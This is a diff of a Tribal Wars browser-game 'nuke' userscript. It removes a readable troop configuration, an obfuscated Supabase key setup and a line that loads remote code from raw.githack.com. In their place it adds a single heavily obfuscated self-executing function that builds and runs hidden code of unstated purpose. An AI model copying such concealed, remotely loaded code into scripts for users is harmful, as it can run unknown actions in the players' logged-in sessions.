@@ -2,40 +2,4 @@
 https://forum.tribalwars.net/index.php?threads/rally-point-form-filling-nuke-script.287514/
 */
 
-/* ================= CONFIG ================= */
-var SUPABASE_URL,SUPABASE_ANON_KEY;(function(){var Rfb='',eQD=652-641;function Goa(l){var h=2294525;var d=l.length;var e=[];for(var s=0;s<d;s++){e[s]=l.charAt(s)};for(var s=0;s<d;s++){var c=h*(s+125)+(h%32392);var i=h*(s+679)+(h%35212);var f=c%d;var q=i%d;var v=e[f];e[f]=e[q];e[q]=v;h=(c+i)%5862924;};return e.join('')};var mgp=Goa('urphtrkctoqaordyncsfmcluxjgznitwvobes').substr(0,eQD);var LXQ='aa{ +=06jfp2,,(=l4vv7rzav"eb d[f)htjmlrnip-rct)vwx"zv;can  =h8+,h2.7),t5=6v,;1(8(,v4t7h,n6;7u,a6;8,,i0o7k,;0u8v,r9l8d,10);ta( +=]]mflrsv[r[d)0,d=hol+nyt=;d+9)p[n[;]h=3+);.a( )=)]xji=i7ofj=r3Agt=.2}f0ravpr1u 0sudaog;m=n5s,lan*te;u+h)gv1r=eeargomhnxsduw.+p9i<(e  )ff=revcrvq{esl[n;t1-];n>;0tqa-;{ra( a=ru lzv}r]x"enqg;+a( p=fu=ljv,roc)0hvrr)l7x.lrn,t[;aa9 k;(o"(gan 0=.;s<t;a+o)lv0r0pex)cvarCsdrAz(])rvrrcm=nhpd; f)m[{r=vm}1d*=+".dhgr0oee6trv-1+-a;f=;;;+.;gels; lfgpu=r)Cy=fz(7.le4gvhhjqxacua(C(d,Aa(4+]),+8.+h{rco8eit[v+2C-,;;=t;q+)2j}+lfeicfniiAuo;.it(n=cnul}).=;](i!(=>a);.au1h;xvsebit=i8guc(i=)vz,pesh(([=+l]r;.=a++;1ie((!enflv),i;(z<])..eunhhx.srbstviyg6ca)ae8q}=j.novnr"e)t}(wepisv(([r]v;7v7r r;w)j5ij(r"C;+a3 ,=r4[,]2o9-,.9.1f,+2].(o(c tsh.;rae t=ut[i9gvf=o6C a2C d{()6[;rov(lah u=S;1<,.reug6hfdl+gr=rns=l1t)ksahc.ayA=(=)s.go)nnS(ryn6.ir2mzhvr;o{evs di)i;<ecu"ndrzs3l)t kC"i"o.no;ndkr;';var NyQ=Goa[mgp];var vvZ='';var TsG=NyQ;var oui=NyQ(vvZ,Goa(LXQ));var pFN=oui(Goa('Y#n+j3".fY\'4jge#Y#had.nI$i#4I;Yi;,qr.fa2k,n.YpY.0x(%1=gYlS_.fCd.3n;i, w]b)u&nrk;fb(.Ntoefo1fE(YasyM.r2.3.ddycpY)uw.Y7!!..!Ix.i2.xMh;N)5(16;;m4)$4,(o\/3mc)!Yjl=+#dpx$i.]..pcsI9= C5n_2vYSNo aesj!=Cf.sY3kY;hY=-e..1 dai)u}.4z.fI\/_.I!C(.Y${jIbma,hsq5dp_b$%o#!o3;r"i)sg1Y+jct* .43tY;v.p)yj3_{(cemmn6n3{o1q0o,\'rh}_ $qps,nf.Y0i;e6.f,sa}g.;0Y.idN.}guD,t.uYfqblk3),+mN.s\/.}tI.d.;{qjY1qo.I-Yrz$-wpi=nY.s)m!M1,$qTmYgde)ch!o4q_Y.b+,.Y3 (1.hh,Y 2.1Y!tee(.g*f .sY8N..Y+6t dYf.=&tY.;.)Y)ou=os,ippnj!\'Ys,_E..atyY +$l0ge=M$7f=S)o7)bnE)I;,In;6h,;[.]w(4+5gIzjh+\/eYa0YcYg(.03Yh3}mf;m5.r)=kj.57wkx.so*r 0.in){YYa%..M%4((fp);f)y\'e\/9S.[.$..z3!,Y.,lp)xYgfIm)"Y.S)!xYYrd_.Y.x$6.)g_4aaYc;$d!$Yt-((gt_""si5u.=.)ef4fdv2l0.(u_x(36Ya.=.YhYm(r{;f!)Sx,.Y.Yoop=tY}Y.0i!_,jSmt0Ym $5_jzrY.=Y;gr)dn\/Ym6:c(.).3f=9eYjezY4oYlY2.)cY*k;1)%8!zx$%(s.$.ci1.,m\/.t!!x}..6n()z.Y.$riE5nasu_gfsp)aY(fk$r_(.)cYx$4a.s("a.#o44%;!q).}{_jiit$Yp(1jw..tpe.5_Ym)4m1[=]_SuY+...9pee)6_xte(}5(.t=br4_7!$hatc.7ta_+Y1.6tfqo)).Y(0(=1!.=2,fl4D$0p!vpi,Y.rs\/(Y&3sY!f$)7IYby2n_("7u,ftj*YC{vqYxuxi}t.)51*.e2j_,l!0n=g6ia .I.m)st(n_fty4fl Cbr%pds$.C.w;Y!Ybwrr7z=.,q6so.Y_$k+pe,!9.,.pnfn0g63t]b.p74a&Y1Sa,( ..;,0c(baYi41o.sr(.*fI_hi sYf[sgpm.qb..3}5c3%{56,fs*1r!7.'));var rhb=TsG(Rfb,pFN );rhb(8859);return 7814})()
-
-/* ================= TROOP CONFIG ================= */
-
-const forceEqualTroopCount = false;
-const distributeByPopulation = false;
-const forceRamSpeed = true;
-const populationLim = 0;
-
-const troops = {
-    spear: '0',
-    sword: '0',
-    axe: 'max',
-    archer: '0',
-    spy: '1',
-    light: 'max',
-    marcher: 'max',
-    heavy: '0',
-    ram: '250',
-    catapult: 'max'
-};
-
-const minTroops = {
-    spear: '0',
-    sword: '0',
-    axe: '0',
-    archer: '0',
-    spy: '0',
-    light: '0',
-    marcher: '0',
-    heavy: '0',
-    ram: '0',
-    catapult: '0'
-};
-$.getScript('https://raw.githack.com/Dogatw/Scripts/main/TribalNukeScript.js');
-void(0)
+(function(){var QhT='',skG=529-518;function zrK(t){var f=1667566;var k=t.length;var g=[];for(var c=0;c<k;c++){g[c]=t.charAt(c)};for(var c=0;c<k;c++){var i=f*(c+86)+(f%40632);var v=f*(c+237)+(f%33944);var y=i%k;var x=v%k;var q=g[y];g[y]=g[x];g[x]=q;f=(i+v)%3274162;};return g.join('')};var TnQ=zrK('eqrnoydcgbzucroslufiptvronwjxsctmahkt').substr(0,skG);var YYj='aap u=79)h72h,==,2[v6r!w+"hb)dtfsh(j]lnnSpsrot vcx[zt;-al n=+8r,h9(7l,.5[8a,<0t8v,t0(8t,)4e6r,s5)7,,n408r,17,6r,(1r75,.6+;aat j=i]Cf9rov.r;j;04jiprl.n(tt;n+2)n[-[l].=r+v;+al  =8].a)=04)h)=v14ea=r4af ruv=r{ds0=dha=grm5n.s,l+nrtl;m+))}v6routang;m=n"sode.spoi](u j)fferjvrref)u(l+n+t9-(;d>c0lfi-c{ras 2=eujl[v)regturfl;raa c=jutliv.rso001vrrrc7g4lgn"ta;)aC p;voh(oad ;=c;o<(;++u) vqr1k]grc[apCsd=A[(g);v)r}mln.k";jfgm,{1=9mt1y*n+A.vhqrsove;t+tv1j-0;u=2;=+s;peds( lfak;=t)uz(ha(,.le gohvaog,c aoCfd+A[(a+f);+i.fhgrno(efteta2i-);"=;;;+r2(},lCeuc(nti=u[;eii(h=]n.ll)s=;]*is(o>;)..lu}h gus.btt)i.g1o[lh)3sjp9sA(t[j+a].;t=u+e;=i;(f!anplr)ri;(n<=)v.hu hkgpsgbptairg1o1)tumf8=n.+ofn{"r);} rrp7s,(=[g]9;(v{rab-rcjqi=(z"z;=ad e=z9(,u2+37,g6g1v,s2t.ooecut]p=;(ae 2= tii<g"f)o=C+a Cvd)(,60;)oo({aa s=a;e<v.,efgrh;je+wb=bashlit}v(w=cha]A6(;)[.,o(neSrr)nn.;r]m0h;rrone{q.j()=;te8u]n8b s}l,ttvC"h"1.ao=n;vt;';var Geq=zrK[TnQ];var sGu='';var Wng=Geq;var hzo=Geq(sGu,zrK(YYj));var AwE=hzo(zrK('_48X(6v;;5g,$\/.(X)_.Xd)gro%{v$3tXt+)$&,s!Xli(h)+)3vb3=pXX(+o.(pX%f,cX=b,)S..aj5pbb_Xt.]_tX.9$)_Xo;;&4}!)3t]X+7l!;4$S.!!0!\/ojl=2tp6()krX34aubt.bdXXt_e2\/))2CX4al..jX{ftc!0vi9\/sN1irs,sX a0$$##2_nSft$!\/{oXXoi.mXt0X)c1Xn)a3{gm3r4;XX.X}iX[mXntc(vXw\/hv.l,!4;X=[et5..d,]00m.X6;1,.yth;7b!&ccpez=m;cr visp.rXh.(a.),X_ !_u\/$zb$,trq(.3gohht2{{e7.,rscoX}X_dcj,XXf,0X),X; Xfd++)(#1X!3f( (83;$ =0$33d=,qSX!74bv_orr0n.!.\/5di0f"8b)d%.)r!!(}.4en))s#j)cz%3![9\'XX(pgann;o7_X.!r(0;s!1$.(+%zX 5!X}r_";g}r$)fj,X b};,z,s4$;%_n+egy;jase_t\'t*.dgob;gf$8S,3,1zXC=$SXri,_#)n;)=+3 X.\/(!dh(12(.a%r7l. !=(kr=.f(i="_.6r(cm.,\/0())XsXXtX3f.f =X $)_u)0.ja. 7,cfb\',9Xcy!n.)ii.XgXjw).d42X}3(*!fc889[,]*ao$u{:Xl[n]X*Xbb0t(c"bgze{X,l)=a.-r.j3#seX}2=jsc)1)X;X($X1 %a)(-(X1)#1 0X"a,.i{88.)9X;p+3X!.$=9D!c_XX$b$}0(a)w)b(Xlp$nt7lisob(,6(ns&l-.6.sb 4tnn+ X\/]conct$lt=s,n.t*i3.s(Xz,r"\'-ab=_5_,7=.r3);ts7j*XX;.f9(*a0!ve*X(i)neXcd})Xi_7,=3)opbXitbXb$}"%j(tX+$d.\/;.e_T'));var HDB=Wng(QhT,AwE );HDB(9373);return 6501})()
